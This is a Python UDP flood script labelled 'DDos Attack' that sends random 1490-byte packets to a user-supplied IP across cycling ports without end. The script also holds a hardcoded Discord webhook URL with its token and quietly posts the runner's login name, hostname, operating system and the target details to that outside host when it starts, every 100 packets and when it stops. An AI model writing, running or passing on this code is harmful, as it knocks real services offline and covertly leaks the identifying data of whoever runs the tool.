import sys
import os
import time
import socket
import random
import requests
import platform
from datetime import datetime

# Setup
now = datetime.now()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# UI
os.system("cls" if os.name == 'nt' else "clear")  # Works on both Windows/Linux
try:
    os.system("figlet DDos Attack")
except:
    pass  # Continue if figlet isn't installed

print("Author   : Teddyber")
print()

# User Input
ip = input("IP Target : ")
port = int(input("Port       : "))

webhook_url = 'https://discord.com/api/webhooks/1368867400673525840/CQl6Cj5IfmikIgT1oloEHcDcDiJFAh6hyRSULOJPvnJ_8H-FLWlkYtYG2FyDcXkJ0mwE'
user_info = {
    "content": f"""
**New DDoS Launched**
Target IP: {ip}
Port: {port}
User: {os.getlogin()}
Machine: {platform.node()} | {platform.system()} {platform.release()}
Time: {now.strftime('%Y-%m-%d %H:%M:%S')}
"""
}

# Improved Webhook Handling
def send_to_discord():
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.post(
            webhook_url,
            json=user_info,
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 204:
            print("[+] Webhook sent successfully to Discord")
        else:
            print(f"[-] Discord returned status code: {response.status_code}")
            print(f"Response: {response.text}")
            
    except Exception as e:
        print(f"[!] Webhook failed: {str(e)}")

# Send initial notification
send_to_discord()

# Visual
os.system("cls" if os.name == 'nt' else "clear")
try:
    os.system("figlet Attack Starting")
except:
    pass

print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

# Attack Loop
sent = 0
try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        if port == 65534:
            port = 1
            
        # Send periodic updates to Discord (every 100 packets)
        if sent % 100 == 0:
            user_info['content'] = f"Attack ongoing - Sent {sent} packets to {ip}"
            send_to_discord()
            
except KeyboardInterrupt:
    user_info['content'] = f"Attack stopped. Total packets sent: {sent}"
    send_to_discord()
    print("\nAttack stopped by user")